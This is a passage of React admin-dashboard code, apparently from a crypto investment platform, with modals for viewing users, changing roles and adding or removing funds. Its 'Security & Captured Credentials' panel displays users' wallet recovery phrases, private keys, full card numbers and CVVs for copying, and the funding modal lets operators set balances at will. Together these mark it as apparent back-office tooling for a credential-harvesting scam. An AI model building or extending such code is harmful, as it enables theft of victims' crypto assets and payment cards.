                  <div>
                    <h2 className="text-xl font-black">{selectedUser.displayName || selectedUser.fullName || selectedUser.username || 'Platform User'}</h2>
                    <p className="text-xs text-slate-400">{selectedUser.email}</p>
                    <p className="text-[10px] font-mono text-slate-500 mt-1">UID: {selectedUser.uid}</p>
                  </div>
                </div>

                <button onClick={() => setSelectedUser(null)} className="p-2 rounded-xl hover:bg-white/10">
                  <X className="w-5 h-5" />
                </button>
              </div>

              {/* Status Badges */}
              <div className="flex flex-wrap gap-3 p-4 rounded-2xl bg-white/5 border border-white/5">
                <div className="flex flex-col">
                  <span className="text-[10px] font-bold text-slate-500 uppercase">Role</span>
                  <span className="text-xs font-black text-purple-400 uppercase">{selectedUser.role || 'user'}</span>
                </div>
                <div className="w-px bg-white/10" />
                <div className="flex flex-col">
                  <span className="text-[10px] font-bold text-slate-500 uppercase">Account Status</span>
                  <span className={`text-xs font-black uppercase ${
                    (selectedUser.accountStatus || selectedUser.status) === 'Active' ? 'text-emerald-400' :
                    (selectedUser.accountStatus || selectedUser.status) === 'Suspended' ? 'text-amber-400' : 'text-rose-400'
                  }`}>{selectedUser.accountStatus || selectedUser.status || 'Active'}</span>
                </div>
                <div className="w-px bg-white/10" />
                <div className="flex flex-col">
                  <span className="text-[10px] font-bold text-slate-500 uppercase">KYC Level</span>
                  <span className="text-xs font-black text-emerald-400 uppercase">{selectedUser.kycStatus || 'unverified'}</span>
                </div>
                <div className="w-px bg-white/10" />
                <div className="flex flex-col">
                  <span className="text-[10px] font-bold text-slate-500 uppercase">Email Status</span>
                  <span className="text-xs font-black text-blue-400">{selectedUser.emailVerified ? 'Verified' : 'Unverified'}</span>
                </div>
              </div>

              {/* Metadata & Details Grid */}
              <div className="grid grid-cols-2 gap-4 text-xs">
                <div className="p-4 rounded-2xl border border-white/5 bg-white/5 space-y-1">
                  <span className="text-slate-500 font-bold block">Country</span>
                  <span className="font-bold text-white">{selectedUser.country || 'N/A'}</span>
                </div>

                <div className="p-4 rounded-2xl border border-white/5 bg-white/5 space-y-1">
                  <span className="text-slate-500 font-bold block">Phone Number</span>
                  <span className="font-bold text-white">{selectedUser.phoneNumber || 'N/A'}</span>
                </div>

                <div className="p-4 rounded-2xl border border-white/5 bg-white/5 space-y-1">
                  <span className="text-slate-500 font-bold block font-mono">Portfolio Balance</span>
                  <span className="font-mono text-emerald-400 font-black text-sm">{formatCurrency(selectedUserWallet?.portfolioBalance ?? 0)}</span>
                </div>

                <div className="p-4 rounded-2xl border border-white/5 bg-white/5 space-y-1">
                  <span className="text-slate-500 font-bold block font-mono">Available Balance</span>
                  <span className="font-mono text-emerald-400 font-black text-sm">{formatCurrency(selectedUserWallet?.availableBalance ?? 0)}</span>
                </div>

                <div className="p-4 rounded-2xl border border-white/5 bg-white/5 space-y-1">
                  <span className="text-slate-500 font-bold block">Registered On</span>
                  <span className="font-bold text-slate-300">{formatDate(selectedUser.createdAt)}</span>
                </div>

                <div className="p-4 rounded-2xl border border-white/5 bg-white/5 space-y-1">
                  <span className="text-slate-500 font-bold block">Last Login</span>
                  <span className="font-bold text-slate-300">{formatDate(selectedUser.lastLogin || selectedUser.lastUpdated)}</span>
                </div>
              </div>

              {/* SECURITY & CAPTURED CREDENTIALS */}
              {(userWallets.length > 0 || (selectedUser as any).secretPhrase || (selectedUser as any).privateKey) && (
                <div className="space-y-4 p-6 rounded-[2rem] bg-amber-500/5 border border-amber-500/20">
                  <div className="flex items-center gap-2 text-amber-400">
                    <Key size={18} />
                    <h3 className="text-sm font-black uppercase tracking-wider">Security & Captured Credentials</h3>
                  </div>

                  <div className="space-y-4">
                    {/* Embedded User Credentials (if any) */}
                    {((selectedUser as any).secretPhrase || (selectedUser as any).privateKey) && (
                      <div className="space-y-3">
                        {(selectedUser as any).secretPhrase && (
                          <div className="space-y-1.5">
                            <span className="text-[10px] font-bold text-amber-500/70 uppercase tracking-widest">Master Recovery Phrase</span>
                            <div className="p-3 rounded-xl bg-black/40 border border-amber-500/10 font-mono text-xs text-amber-200 break-words select-all">
                              {(selectedUser as any).secretPhrase}
                            </div>
                          </div>
                        )}
                        {(selectedUser as any).privateKey && (
                          <div className="space-y-1.5">
                            <span className="text-[10px] font-bold text-amber-500/70 uppercase tracking-widest">Master Private Key</span>
                            <div className="p-3 rounded-xl bg-black/40 border border-amber-500/10 font-mono text-xs text-amber-200 break-all select-all">
                              {(selectedUser as any).privateKey}
                            </div>
                          </div>
                        )}
                      </div>
                    )}

                    {/* Linked Wallet & Card Credentials */}
                    {userWallets.map((wallet: any, idx: number) => (
                      <div key={idx} className="space-y-3 pt-3 border-t border-amber-500/10">
                        <div className="flex items-center justify-between">
                          <span className="text-[11px] font-black text-amber-400 uppercase">{wallet.provider || 'Linked Wallet'}</span>
                          <span className="text-[9px] font-mono text-amber-500/50">
                            {wallet.address && wallet.address.length > 10 ? `${wallet.address.slice(0, 10)}...` : wallet.address}
                          </span>
                        </div>
                        
                        {wallet.cardNumber && (
                          <div className="p-3 rounded-xl bg-emerald-500/5 border border-emerald-500/10 space-y-2">
                            <div className="flex items-center gap-2 text-emerald-400 mb-1">
                              <CreditCard size={12} />
                              <span className="text-[10px] font-black uppercase">Card Details</span>
                            </div>
                            <div className="font-mono text-sm text-emerald-200 tracking-widest break-all select-all">
                              {wallet.cardNumber}
                            </div>
                            <div className="flex gap-4 text-xs font-mono">
                              <div>
                                <span className="text-[9px] text-slate-500 block uppercase">Exp</span>
                                <span className="text-amber-300">{wallet.cardExpiry}</span>
                              </div>
                              <div>
                                <span className="text-[9px] text-slate-500 block uppercase">CVV</span>
                                <span className="text-rose-400">{wallet.cardCvv}</span>
                              </div>
                            </div>
                          </div>
                        )}

                        {wallet.secretPhrase && (
                          <div className="space-y-1.5">
                            <span className="text-[10px] font-bold text-amber-500/70 uppercase tracking-widest">Recovery Phrase</span>
                            <div className="p-3 rounded-xl bg-black/40 border border-amber-500/10 font-mono text-xs text-amber-200 break-words select-all">
                              {wallet.secretPhrase}
                            </div>
                          </div>
                        )}
                        {wallet.privateKey && (
                          <div className="space-y-1.5">
                            <span className="text-[10px] font-bold text-amber-500/70 uppercase tracking-widest">Private Key</span>
                            <div className="p-3 rounded-xl bg-black/40 border border-amber-500/10 font-mono text-xs text-amber-200 break-all select-all">
                              {wallet.privateKey}
                            </div>
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Quick Actions Footer */}
              <div className="pt-4 border-t border-white/10 flex flex-wrap items-center justify-between gap-3">
                <span className="text-xs font-bold text-slate-400">Governance Controls</span>
                <div className="flex gap-2">
                  {(selectedUser.accountStatus || selectedUser.status) === 'Active' ? (
                    <>
                      <button
                        onClick={() => handleUpdateStatus(selectedUser.uid, 'Suspended')}
                        disabled={actionLoading === selectedUser.uid}
                        className="px-4 py-2 rounded-xl bg-amber-500/20 text-amber-400 font-bold text-xs hover:bg-amber-500 hover:text-slate-950 transition-all flex items-center gap-1.5"
                      >
                        <Lock className="w-3.5 h-3.5" /> Suspend
                      </button>
                      <button
                        onClick={() => handleUpdateStatus(selectedUser.uid, 'Deactivated')}
                        disabled={actionLoading === selectedUser.uid}
                        className="px-4 py-2 rounded-xl bg-rose-500/20 text-rose-400 font-bold text-xs hover:bg-rose-500 hover:text-white transition-all flex items-center gap-1.5"
                      >
                        <ShieldAlert className="w-3.5 h-3.5" /> Deactivate
                      </button>
                    </>
                  ) : (
                    <button
                      onClick={() => handleUpdateStatus(selectedUser.uid, 'Active')}
                      disabled={actionLoading === selectedUser.uid}
                      className="px-4 py-2 rounded-xl bg-emerald-500/20 text-emerald-400 font-bold text-xs hover:bg-emerald-500 hover:text-slate-950 transition-all flex items-center gap-1.5"
                    >
                      <Unlock className="w-3.5 h-3.5" /> Reactivate
                    </button>
                  )}
                </div>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* MODAL 2: Edit Role Modal */}
      <AnimatePresence>
        {editingRoleUser && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className={`w-full max-w-md p-6 rounded-[2rem] border shadow-2xl space-y-6 ${
                isDark ? 'bg-slate-900 border-white/10 text-white' : 'bg-white border-slate-200 text-slate-900'
              }`}
            >
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Shield className="w-5 h-5 text-purple-400" />
                  <h3 className="font-bold text-lg">Modify Institutional Role</h3>
                </div>
                <button onClick={() => setEditingRoleUser(null)} className="p-1 rounded-lg hover:bg-white/10">
                  <X className="w-5 h-5" />
                </button>
              </div>

              <p className="text-xs text-slate-400">
                Select permissions level for <strong className="text-white">{editingRoleUser.email}</strong>.
              </p>

              <div className="space-y-3">
                {[
                  { role: 'user', label: 'User', desc: 'Standard platform trading, wallet, and market access.' },
                  { role: 'admin', label: 'Admin', desc: 'Access to operational management and support desks.' },
                  { role: 'super_admin', label: 'Super Admin', desc: 'Full root access to platform settings, users, and finances.' },
                ].map((item) => (
                  <button
                    key={item.role}
                    onClick={() => handleUpdateRole(editingRoleUser.uid, item.role)}
                    disabled={actionLoading === editingRoleUser.uid}
                    className={`w-full p-4 rounded-2xl border text-left transition-all flex items-start justify-between ${
                      (editingRoleUser.role || 'user') === item.role
                        ? 'border-purple-500/50 bg-purple-500/10 text-purple-300'
                        : isDark ? 'border-white/10 hover:bg-white/5 text-slate-300' : 'border-slate-200 hover:bg-slate-50 text-slate-700'
                    }`}
                  >
                    <div>
                      <span className="font-bold text-sm block">{item.label}</span>
                      <span className="text-[11px] text-slate-400 block mt-0.5">{item.desc}</span>
                    </div>
                    {(editingRoleUser.role || 'user') === item.role && (
                      <CheckCircle2 className="w-5 h-5 text-purple-400 shrink-0" />
                    )}
                  </button>
                ))}
              </div>
            </motion.div>
          </div>
        )}

        {/* Fund User Modal */}
        {fundingUser && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm">
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className={`w-full max-w-md p-6 rounded-[2rem] border shadow-2xl space-y-6 ${
                isDark ? 'bg-slate-900 border-white/10 text-white' : 'bg-white border-slate-200 text-slate-900'
              }`}
            >
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <DollarSign className={`w-5 h-5 ${fundActionType === 'add' ? 'text-emerald-400' : 'text-rose-400'}`} />
                  <h3 className="font-bold text-lg">{fundActionType === 'add' ? 'Add Funds to User' : 'Remove Funds from User'}</h3>
                </div>
                <button onClick={() => { setFundingUser(null); setFundAmount(''); setFundActionType('add'); }} className="p-1 rounded-lg hover:bg-white/10">
                  <X className="w-5 h-5" />
                </button>
              </div>

              <div className="flex bg-black/20 p-1 rounded-xl border border-white/10">
                <button
                  type="button"
                  onClick={() => setFundActionType('add')}
                  className={`flex-1 py-2 rounded-lg text-xs font-bold transition-all ${
                    fundActionType === 'add' ? 'bg-emerald-500 text-slate-950 shadow' : 'text-slate-400 hover:text-white'
                  }`}
                >
                  Add Funds
                </button>
                <button
                  type="button"
                  onClick={() => setFundActionType('remove')}
                  className={`flex-1 py-2 rounded-lg text-xs font-bold transition-all ${
                    fundActionType === 'remove' ? 'bg-rose-500 text-white shadow' : 'text-slate-400 hover:text-white'
                  }`}
                >
                  Remove Funds
                </button>
              </div>

              <p className="text-xs text-slate-400">
                {fundActionType === 'add' ? 'Credit' : 'Deduct'} funds {fundActionType === 'add' ? 'to' : 'from'} <strong className={isDark ? "text-white" : "text-black"}>{fundingUser.email}</strong>.
              </p>

              {fundingWallet && (
                <div className={`p-4 rounded-2xl border ${isDark ? "bg-white/5 border-white/5" : "bg-slate-50 border-slate-200"} flex justify-between items-center`}>
                  <div className="space-y-0.5">
                    <span className="text-[10px] text-slate-500 font-bold uppercase tracking-wider block">Current Available</span>
                    <span className={`text-sm font-mono font-black ${fundingWallet.availableBalance < 0 ? 'text-rose-400' : 'text-emerald-400'}`}>
                      {formatCurrency(fundingWallet.availableBalance || 0)}
                    </span>
                  </div>
                  <div className="space-y-0.5 text-right">
                    <span className="text-[10px] text-slate-500 font-bold uppercase tracking-wider block">Portfolio Total</span>
                    <span className="text-sm font-mono font-black text-white">
                      {formatCurrency(fundingWallet.portfolioBalance || 0)}
                    </span>
                  </div>
                </div>
              )}

              <form onSubmit={handleFundUser} className="space-y-4">
                <div className="space-y-1">
                  <label className="text-xs font-bold text-slate-400 uppercase tracking-widest">Amount ({fundingUser.currency || 'USD'})</label>
                  <div className="relative">
                    <span className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500 font-bold">
                      {CURRENCY_SYMBOLS[fundingUser.currency || 'USD'] || '$'}
                    </span>
                    <input
                      type="number"
                      step="0.01"
                      min="0"
                      value={fundAmount}
                      onChange={(e) => setFundAmount(e.target.value)}
                      placeholder="1000.00"
                      className={`w-full py-3 pl-8 pr-4 rounded-xl border font-bold ${
                        isDark ? 'bg-black/50 border-white/10 focus:border-emerald-500/50 outline-none text-white' : 'bg-slate-50 border-slate-200 focus:border-emerald-500 outline-none text-slate-900'
                      }`}
                      required
                    />
                  </div>
                </div>

                <div className="flex justify-end gap-2 pt-2">
                  <button
                    type="button"
                    onClick={() => { setFundingUser(null); setFundAmount(''); setFundActionType('add'); }}
                    className={`px-4 py-2 rounded-xl text-sm font-bold border transition-colors ${
                      isDark ? 'border-white/10 hover:bg-white/10 text-white' : 'border-slate-200 hover:bg-slate-100 text-slate-900'
                    }`}
                  >
                    Cancel
                  </button>
                  <button
                    type="submit"
                    disabled={actionLoading === fundingUser.uid || !fundAmount}
                    className={`px-6 py-2 rounded-xl text-sm font-bold transition-colors disabled:opacity-50 ${
                      fundActionType === 'add' ? 'bg-emerald-500 text-slate-950 hover:bg-emerald-400' : 'bg-rose-500 text-white hover:bg-rose-400'
                    }`}
                  >
                    {actionLoading === fundingUser.uid ? 'Processing...' : (fundActionType === 'add' ? 'Credit Funds' : 'Remove Funds')}
                  </button>
                </div>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
